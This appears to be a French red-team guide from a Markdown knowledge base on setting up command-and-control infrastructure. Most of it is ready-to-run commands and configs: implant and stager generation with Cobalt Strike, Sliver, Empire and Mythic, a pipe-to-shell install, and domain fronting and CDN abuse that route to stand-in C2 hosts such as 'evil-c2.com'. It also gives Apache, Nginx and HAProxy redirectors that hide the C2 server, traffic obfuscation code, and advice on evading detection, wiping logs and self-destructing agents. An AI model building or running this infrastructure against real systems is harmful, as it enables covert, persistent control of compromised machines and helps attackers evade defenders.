# Infrastructure Command & Control (C2) - Guide Complet

## 🗂️ Workflow de déploiement C2
1. Planification et architecture de l'infrastructure
   ↓
2. Acquisition et configuration des domaines/serveurs
   ↓
3. Déploiement des redirecteurs et proxies
   ↓
4. Installation et configuration du serveur C2
   ↓
5. Test de la chaîne de communication
   ↓
6. Déploiement des agents et monitoring

## 📋 Vue d'ensemble

L'infrastructure Command & Control permet aux Red Teams de maintenir un contrôle persistant et discret sur les systèmes compromis via des canaux de communication chiffrés et camouflés.

> **💡 Explication Simple** : C'est comme installer un système radio secret dans une ville occupée pour coordonner les résistants. Les messages passent par plusieurs relais pour éviter l'interception.

## 🏗️ Architecture C2 Moderne

### Topologie en couches
```
[Opérateur Red Team]
        ↓
[Serveur C2 Principal]
        ↓
[Redirecteurs/Proxies]
        ↓
[Domain Fronting/CDN]
        ↓
[Agents sur cibles]
```

### Composants de l'infrastructure
```
1. SERVEUR C2 PRINCIPAL
   ├── Interface de contrôle
   ├── Base de données des sessions
   ├── Gestionnaire de payloads
   └── Système de logs

2. REDIRECTEURS
   ├── Apache/Nginx proxies
   ├── Socat redirectors
   ├── HAProxy load balancers
   └── Firewall rules

3. DOMAINES ET DNS
   ├── Domaines legit-looking
   ├── Subdomains wildcard
   ├── DNS over HTTPS
   └── Fast flux DNS

4. AGENTS ET IMPLANTS
   ├── Beacon/implant principal
   ├── Payload stageless/staged
   ├── Communication protocols
   └── Persistence mechanisms
```

## 🛠️ Frameworks C2 Populaires

### Cobalt Strike (Commercial)
```bash
# Installation serveur Cobalt Strike
java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC \
     -Xms512M -Xmx1024M -jar cobaltstrike.jar

# Génération d'un beacon
# Via interface GUI ou commandes
beacon> shell whoami
beacon> ps
beacon> inject [pid] x64 payload.bin
beacon> spawn x64 windows/beacon_https/reverse_https
```

### Sliver (Open Source)
```bash
# Installation Sliver
curl https://sliver.sh/install | sudo bash

# Démarrage serveur
sliver-server

# Génération d'implant
[server] sliver > generate --http example.com --save /tmp/

# Contrôle d'implant
[server] sliver > use [session-id]
[*] Active session: PRACTICAL_GIRAFFE (windows/amd64) - example.com:8080
sliver (PRACTICAL_GIRAFFE) > info
sliver (PRACTICAL_GIRAFFE) > shell
```

### Empire/Starkiller
```bash
# Installation Empire
git clone https://github.com/EmpireProject/Empire.git
cd Empire && sudo ./setup/install.sh

# Démarrage
sudo ./empire --rest --restport 1337

# Interface Starkiller
git clone https://github.com/BC-SECURITY/Starkiller.git
cd Starkiller && npm install && npm run electron:serve

# Génération d'agent PowerShell
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host https://example.com:443
(Empire: listeners/http) > execute

(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > generate
```

### Mythic
```bash
# Installation Mythic
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic && sudo make install

# Démarrage
sudo ./mythic-cli start

# Interface web: https://localhost:7443

# Installation d'un agent (ex: Apfell)
sudo ./mythic-cli install github https://github.com/MythicAgents/apfell.git
```

## 🌐 Techniques de Camouflage

### Domain Fronting
```bash
# Configuration avec CloudFlare
# 1. Domaine légal pointant vers CloudFlare
# 2. Configuration DNS
dig +short example-legit.com
# 104.16.x.x (CloudFlare IP)

# 3. Configuration agent pour domain fronting
curl -H "Host: evil-c2.com" https://example-legit.com/beacon

# 4. Script automatisation domain fronting
python3 << 'EOF'
import requests

headers = {
    'Host': 'malicious-c2.actual-domain.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

response = requests.get('https://legitimate-cdn-domain.com/api/check', 
                       headers=headers, verify=False)
print(response.text)
EOF
```

### CDN Abuse
```bash
# Utilisation d'AWS CloudFront
aws cloudfront create-distribution \
    --distribution-config file://distribution-config.json

# Configuration JSON pour CloudFront
cat > distribution-config.json << 'EOF'
{
    "CallerReference": "c2-distribution-$(date +%s)",
    "Origins": {
        "Quantity": 1,
        "Items": [
            {
                "Id": "c2-origin",
                "DomainName": "actual-c2-server.com",
                "CustomOriginConfig": {
                    "HTTPPort": 443,
                    "HTTPSPort": 443,
                    "OriginProtocolPolicy": "https-only"
                }
            }
        ]
    },
    "DefaultCacheBehavior": {
        "TargetOriginId": "c2-origin",
        "ViewerProtocolPolicy": "redirect-to-https",
        "TrustedSigners": {
            "Enabled": false,
            "Quantity": 0
        }
    },
    "Enabled": true
}
EOF
```

### Traffic Encryption et Obfuscation
```python
# Chiffrement XOR simple pour C2
def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# Base64 + XOR pour payload
import base64
def encode_payload(command, key="secretkey"):
    encrypted = xor_encrypt(command, key)
    encoded = base64.b64encode(encrypted.encode()).decode()
    return encoded

# Usage dans beacon
command = "whoami"
payload = encode_payload(command)
print(f"Encrypted payload: {payload}")
```

## 🚧 Redirecteurs et Proxies

### Apache mod_rewrite
```apache
# Configuration Apache redirecteur
<VirtualHost *:443>
    ServerName legitimate-looking-domain.com
    
    # SSL Configuration
    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/domain.crt
    SSLCertificateKeyFile /etc/ssl/private/domain.key
    
    # Filtering based on User-Agent
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} "^Mozilla.*Windows NT.*" [NC]
    RewriteRule ^/api/(.*)$ https://actual-c2-server.com:443/api/$1 [P,L]
    
    # Default redirect to innocent site
    RewriteRule ^(.*)$ https://legitimate-company.com$1 [R=302,L]
    
    # Logging
    LogLevel warn
    ErrorLog /var/log/apache2/c2-redirector_error.log
    CustomLog /var/log/apache2/c2-redirector_access.log combined
</VirtualHost>
```

### Nginx Reverse Proxy
```nginx
# Configuration Nginx redirecteur
server {
    listen 443 ssl;
    server_name legitimate-api.com;
    
    ssl_certificate /etc/ssl/certs/legitimate-api.com.pem;
    ssl_certificate_key /etc/ssl/private/legitimate-api.com.key;
    
    # Filtering legitimate traffic
    location /api/v1/ {
        # Check specific headers
        if ($http_x_custom_header != "expected-value") {
            return 404;
        }
        
        proxy_pass https://real-c2-server.internal:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_ssl_verify off;
    }
    
    # Default behavior
    location / {
        return 302 https://legitimate-company.com$request_uri;
    }
}
```

### HAProxy Load Balancer
```bash
# Configuration HAProxy pour C2
cat > /etc/haproxy/haproxy.cfg << 'EOF'
global
    daemon
    maxconn 4096

defaults
    mode http
    timeout connect 10000ms
    timeout client 60000ms
    timeout server 60000ms

frontend c2_frontend
    bind *:443 ssl crt /etc/ssl/certs/domain.pem
    
    # ACL for filtering
    acl valid_beacon hdr(User-Agent) -m sub "Mozilla"
    acl api_path path_beg /api/
    
    use_backend c2_servers if valid_beacon api_path
    default_backend decoy_backend

backend c2_servers
    balance roundrobin
    server c2-1 192.168.1.100:8443 check ssl verify none
    server c2-2 192.168.1.101:8443 check ssl verify none

backend decoy_backend
    server decoy 1.2.3.4:443 check ssl verify none
EOF

systemctl restart haproxy
```

## 🔒 Sécurisation C2

### Authentification et Autorisation
```python
# Système d'authentification pour C2 custom
import hashlib
import hmac
import time

class C2Auth:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def generate_token(self, agent_id):
        timestamp = str(int(time.time()))
        message = f"{agent_id}:{timestamp}"
        signature = hmac.new(
            self.secret_key.encode(),
            message.encode(),
            hashlib.sha256
        ).hexdigest()
        return f"{message}:{signature}"
    
    def validate_token(self, token, max_age=300):
        try:
            agent_id, timestamp, signature = token.split(':')
            
            # Check timestamp
            if int(time.time()) - int(timestamp) > max_age:
                return False
            
            # Verify signature
            expected = self.generate_token(agent_id)
            return hmac.compare_digest(token, expected)
        except:
            return False

# Usage
auth = C2Auth("supersecretkey")
token = auth.generate_token("agent-001")
valid = auth.validate_token(token)
```

### Chiffrement des Communications
```python
# Chiffrement AES pour communications C2
from cryptography.fernet import Fernet
import base64

class C2Crypto:
    def __init__(self, key=None):
        if key:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt_command(self, command):
        encrypted = self.cipher.encrypt(command.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt_response(self, encrypted_response):
        decoded = base64.b64decode(encrypted_response.encode())
        decrypted = self.cipher.decrypt(decoded)
        return decrypted.decode()

# Utilisation dans agent
crypto = C2Crypto()
encrypted_cmd = crypto.encrypt_command("whoami")
```

## 📊 Monitoring et Logging

### Système de logs centralisé
```bash
# Configuration rsyslog pour C2
cat > /etc/rsyslog.d/99-c2.conf << 'EOF'
# C2 Infrastructure Logging
$template C2Format,"%timestamp% %HOSTNAME% %syslogtag%%msg%\n"

# Redirector logs
if $programname == 'apache2' then /var/log/c2/redirector.log;C2Format
if $programname == 'nginx' then /var/log/c2/redirector.log;C2Format

# C2 server logs
if $programname == 'sliver' then /var/log/c2/server.log;C2Format
if $programname == 'empire' then /var/log/c2/server.log;C2Format
EOF

systemctl restart rsyslog
```

### Dashboard de monitoring
```python
# Dashboard simple pour monitoring C2
from flask import Flask, render_template, jsonify
import json
import datetime

app = Flask(__name__)

class C2Monitor:
    def __init__(self):
        self.active_sessions = {}
        self.connection_logs = []
    
    def add_session(self, session_id, info):
        self.active_sessions[session_id] = {
            'info': info,
            'last_seen': datetime.datetime.now(),
            'commands_sent': 0
        }
    
    def log_connection(self, ip, user_agent, status):
        self.connection_logs.append({
            'timestamp': datetime.datetime.now(),
            'ip': ip,
            'user_agent': user_agent,
            'status': status
        })
    
    def get_stats(self):
        return {
            'active_sessions': len(self.active_sessions),
            'total_connections': len(self.connection_logs),
            'last_hour_connections': len([
                log for log in self.connection_logs
                if (datetime.datetime.now() - log['timestamp']).seconds < 3600
            ])
        }

monitor = C2Monitor()

@app.route('/dashboard')
def dashboard():
    stats = monitor.get_stats()
    return render_template('dashboard.html', stats=stats)

@app.route('/api/stats')
def api_stats():
    return jsonify(monitor.get_stats())
```

## 🛡️ Conseils OPSEC
- Utiliser des domaines à l'apparence légitime avec historique propre
- Implémenter plusieurs couches de redirecteurs pour brouiller les traces
- Varier les intervalles de communication pour éviter la détection pattern
- Chiffrer toutes les communications avec des clés rotatives
- Surveiller les logs pour détecter les tentatives d'analyse

## ⚠️ Erreurs fréquentes
- Exposer directement le serveur C2 sans redirecteurs (traceable)
- Utiliser des certificats auto-signés (suspicieux)
- Communications trop fréquentes ou prévisibles (détectable)
- Ne pas nettoyer les logs après opération
- Réutiliser la même infrastructure pour plusieurs missions

## 💡 Astuces
- Utiliser des services cloud légitimes comme AWS/Azure pour héberger
- Implémenter des domaines de fallback automatiques
- Créer des profils de communication mimant du trafic légitime
- Utiliser des techniques de jitter et sleep aléatoire
- Prévoir des mécanismes d'autodestruction des agents

## 🔗 Pour aller plus loin
- [Cobalt Strike Documentation](https://www.cobaltstrike.com/help)
- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [Empire Project](https://github.com/EmpireProject/Empire)
- [Mythic C2](https://github.com/its-a-feature/Mythic)
- [RedTeam Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)

## 🧭 Navigation
- [Guide Evasion](../Evasion/AV-Bypass-Techniques.md)
- [Guide Advanced TTPs](../Advanced-TTPs/Living-Off-The-Land.md)
- [Retour au Red Team](../README.md) 